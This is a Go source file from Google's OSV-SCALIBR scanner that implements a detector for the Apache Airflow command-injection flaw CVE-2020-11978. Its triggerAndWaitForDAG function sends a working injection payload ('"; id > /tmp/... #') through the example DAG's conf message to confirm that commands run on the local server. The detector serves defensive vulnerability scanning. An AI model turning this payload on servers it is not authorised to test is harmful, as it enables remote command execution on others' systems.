// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Package cve202011978 implements a detector for CVE-2020-11978.
// This can be deployed by cloning https://github.com/pberba/CVE-2020-11978
// and running docker-compose up in the directory.
package cve202011978

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/google/osv-scalibr/detector"
	"github.com/google/osv-scalibr/extractor"
	"github.com/google/osv-scalibr/extractor/filesystem/language/python/wheelegg"
	scalibrfs "github.com/google/osv-scalibr/fs"
	"github.com/google/osv-scalibr/inventoryindex"
	"github.com/google/osv-scalibr/log"
	"github.com/google/osv-scalibr/plugin"
)

type airflowPackageNames struct {
	packageType      string
	name             string
	affectedVersions []string
}

const (
	airflowServerIP   = "127.0.0.1"
	airflowServerPort = 8080
	defaultTimeout    = 5 * time.Second
	schedulerTimeout  = 10 * time.Second
	loopTimeout       = 2 * time.Minute
)

var (
	seededRand      = rand.New(rand.NewSource(time.Now().UnixNano()))
	randFilePath    = fmt.Sprintf("/tmp/%s", randomString(16))
	airflowPackages = []airflowPackageNames{
		{
			packageType: "pypi",
			name:        "apache-airflow",
			affectedVersions: []string{
				"1.10.10",
				"1.10.10rc5",
				"1.10.10rc4",
				"1.10.10rc3",
				"1.10.10rc2",
				"1.10.10rc1",
				"1.10.9",
				"1.10.9rc1",
				"1.10.8",
				"1.10.8rc1",
				"1.10.7",
				"1.10.7rc3",
				"1.10.7rc2",
				"1.10.7rc1",
				"1.10.6",
				"1.10.6rc2",
				"1.10.6rc1",
				"1.10.5",
				"1.10.5rc1",
				"1.10.4",
				"1.10.4rc5",
				"1.10.4rc4",
				"1.10.4rc3",
				"1.10.4rc2",
				"1.10.4rc1",
				"1.10.4b2",
				"1.10.3",
				"1.10.3rc2",
				"1.10.3rc1",
				"1.10.3b2",
				"1.10.3b1",
				"1.10.2",
				"1.10.2rc3",
				"1.10.2rc2",
				"1.10.2rc1",
				"1.10.2b2",
				"1.10.1",
				"1.10.1rc2",
				"1.10.1b1",
				"1.10.0",
				"1.9.0",
				"1.8.2",
				"1.8.2rc1",
				"1.8.1",
				"1.7",
				"1.6.2",
				"1.6.1",
				"1.6.0",
				"1.5.2",
				"1.5.1",
				"1.5.0",
				"1.4.0",
			},
		},
	}
)

// Detector is a SCALIBR Detector for CVE-2020-11978.
type Detector struct{}

// Name of the detector.
func (Detector) Name() string { return "cve/CVE-2020-11978" }

// Version of the detector.
func (Detector) Version() int { return 0 }

// Requirements of the detector.
func (Detector) Requirements() *plugin.Capabilities {
	return &plugin.Capabilities{DirectFS: true, RunningSystem: true, OS: plugin.OSLinux}
}

// RequiredExtractors returns the python wheel extractor.
func (Detector) RequiredExtractors() []string { return []string{wheelegg.Name} }

func findairflowVersions(ix *inventoryindex.InventoryIndex) (string, *extractor.Inventory, []string) {
	for _, r := range airflowPackages {
		for _, i := range ix.GetSpecific(r.name, r.packageType) {
			return i.Version, i, r.affectedVersions
		}
	}
	return "", nil, []string{}
}

// Scan checks for the presence of the airflow CVE-2020-11978 vulnerability on the filesystem.
func (d Detector) Scan(ctx context.Context, scanRoot *scalibrfs.ScanRoot, ix *inventoryindex.InventoryIndex) ([]*detector.Finding, error) {
	airflowVersion, inventory, affectedVersions := findairflowVersions(ix)
	if airflowVersion == "" {
		log.Debugf("No airflow version found")
		return nil, nil
	}

	isVulnVersion := false
	for _, r := range affectedVersions {
		if strings.Contains(airflowVersion, r) {
			isVulnVersion = true
		}
	}

	if !isVulnVersion {
		log.Infof("Version %q not vuln", airflowVersion)
		return nil, nil
	}

	log.Infof("Found Potentially vulnerable airflow version %v", airflowVersion)

	if !CheckAccessibility(airflowServerIP, airflowServerPort) {
		log.Infof("Airflow server not accessible. Version %q not vulnerable", airflowVersion)
		return nil, nil
	}

	if !CheckForBashTask(airflowServerIP, airflowServerPort) {
		log.Infof("Version %q not vulnerable", airflowVersion)
		return nil, nil
	}

	if !CheckForPause(airflowServerIP, airflowServerPort) {
		log.Infof("Version %q not vulnerable", airflowVersion)
		return nil, nil
	}

	if !triggerAndWaitForDAG(ctx, airflowServerIP, airflowServerPort) {
		log.Infof("Version %q not vulnerable", airflowVersion)
		return nil, nil
	}

	if !fileExists(scanRoot.FS, randFilePath) {
		return nil, nil
	}

	log.Infof("Version %q is vulnerable", airflowVersion)

	err := os.Remove(randFilePath)
	if err != nil {
		log.Infof("Error removing file: %v", err)
	}

	return []*detector.Finding{{
		Adv: &detector.Advisory{
			ID: &detector.AdvisoryID{
				Publisher: "SCALIBR",
				Reference: "CVE-2020-11978",
			},
			Type:           detector.TypeVulnerability,
			Title:          "CVE-2020-11978",
			Description:    "CVE-2020-11978",
			Recommendation: "Update apache-airflow to version 1.10.11 or later",
			Sev:            &detector.Severity{Severity: detector.SeverityCritical},
		},
		Target: &detector.TargetDetails{
			Inventory: inventory,
		},
		Extra: fmt.Sprintf("%s %s %s", inventory.Name, inventory.Version, strings.Join(inventory.Locations, ", ")),
	}}, nil
}

// CheckAccessibility checks if the airflow server is accessible.
func CheckAccessibility(airflowIP string, airflowServerPort int) bool {
	target := fmt.Sprintf("http://%s:%d/api/experimental/test", airflowIP, airflowServerPort)

	client := &http.Client{Timeout: defaultTimeout}
	resp, err := client.Get(target)
	if err != nil {
		log.Infof("Request failed: %v", err)
		return false
	}
	defer resp.Body.Close()
	return true
}

// CheckForBashTask checks if the airflow server has a bash task.
func CheckForBashTask(airflowIP string, airflowServerPort int) bool {
	target := fmt.Sprintf("http://%s:%d/api/experimental/dags/example_trigger_target_dag/tasks/bash_task", airflowIP, airflowServerPort)

	client := &http.Client{Timeout: defaultTimeout}
	resp, err := client.Get(target)
	if err != nil {
		log.Infof("Request failed: %v", err)
		return false
	}
	defer resp.Body.Close()

	BashTaskPresence := resp.StatusCode == 200
	if !BashTaskPresence {
		return false
	}

	var data map[string]any
	if err = json.NewDecoder(resp.Body).Decode(&data); err != nil {
		log.Infof("Error parsing JSON: %v", err)
		return false
	}

	if _, exists := data["env"]; !exists {
		log.Infof("Key 'env' does not exist in the JSON data")
		return false
	}

	envValue, ok := data["env"].(string)
	if !ok {
		log.Infof("Value of 'env' is not a string")
		return false
	}

	if !strings.Contains(envValue, "dag_run") {
		log.Infof("Value of 'env' does not contain 'dag_run'")
		return true
	}
	return false
}

// CheckForPause checks if the airflow server has a paused dag.
func CheckForPause(airflowIP string, airflowServerPort int) bool {
	target := fmt.Sprintf("http://%s:%d/api/experimental/dags/example_trigger_target_dag/paused/false", airflowIP, airflowServerPort)

	client := &http.Client{Timeout: defaultTimeout}
	resp, err := client.Get(target)
	if err != nil {
		log.Infof("Request failed: %v", err)
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

// triggerAndWaitForDAG achieves command execution via DAG scheduling using the example bash task from above.
func triggerAndWaitForDAG(ctx context.Context, airflowIP string, airflowServerPort int) bool {
	dagURL := fmt.Sprintf("http://%s:%d/api/experimental/dags/example_trigger_target_dag/dag_runs", airflowIP, airflowServerPort)
	payload := map[string]any{
		"conf": map[string]string{
			"message": fmt.Sprintf(`"; id > %s #`, randFilePath),
		},
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return false
	}

	req, err := http.NewRequestWithContext(ctx, "POST", dagURL, bytes.NewBuffer(jsonPayload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: defaultTimeout}
	res, err := client.Do(req)
	if err != nil {
		if errors.Is(err, context.DeadlineExceeded) {
			fmt.Println("Request timed out")
		} else {
			fmt.Println("Error making request:", err)
		}
		return false
	}
	defer res.Body.Close()

	if res.StatusCode != 200 {
		return false
	}

	var resBody map[string]any
	if err := json.NewDecoder(res.Body).Decode(&resBody); err != nil {
		return false
	}

	log.Infof("Successfully created DAG")

	// Check for the existence of "message" and "execution_date"
	if _, messagePresent := resBody["message"]; !messagePresent {
		log.Errorf("Key 'message' not found in response body")
		return false
	}

	log.Infof("\"%s\"\n", resBody["message"])

	if _, execDatePresent := resBody["execution_date"]; !execDatePresent {
		log.Errorf("Key 'execution_date' not found in response body")
		return false
	}

	waitURL := fmt.Sprintf("http://%s:%d/api/experimental/dags/example_trigger_target_dag/dag_runs/%s/tasks/bash_task",
		airflowIP, airflowServerPort, resBody["execution_date"])

	log.Infof("Waiting for the scheduler to run the DAG... This might take a minute.")
	log.Infof("If the bash task is never queued, then the scheduler might not be running.")

	startTime := time.Now()
	for {
		if time.Since(startTime) > loopTimeout {
			log.Infof("Timeout reached (2 minutes). Probably stuck or not exploitable")
			return false
		}
		time.Sleep(schedulerTimeout)
		res, err := http.Get(waitURL)
		if err != nil {
			log.Infof("failed to get task status: %v", err)
		}

		var statusBody map[string]any
		if err := json.NewDecoder(res.Body).Decode(&statusBody); err != nil {
			log.Infof("failed to decode status response: %v", err)
			return false
		}
		res.Body.Close()

		log.Infof("statusBody: %v", statusBody)
		status := statusBody["state"].(string)
		switch status {
		case "scheduled":
			log.Infof("Bash task scheduled")
			log.Infof("Waiting for the scheduler to run the DAG")
		case "queued":
			log.Infof("Bash task queued")
		case "running":
			log.Infof("Bash task running")
		case "success":
			log.Infof("Bash task successfully ran")
			return true
		case "None":
			log.Infof("Bash task is not yet queued")
			return false
		default:
			return false
		}
	}
}

func fileExists(filesys scalibrfs.FS, path string) bool {
	_, err := fs.Stat(filesys, path)
	return !os.IsNotExist(err)
}

func randomString(length int) string {
	charSet := "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ"
	b := make([]byte, length)
	for i := range b {
		b[i] = charSet[seededRand.Intn(len(charSet)-1)]
	}
	return string(b)
}
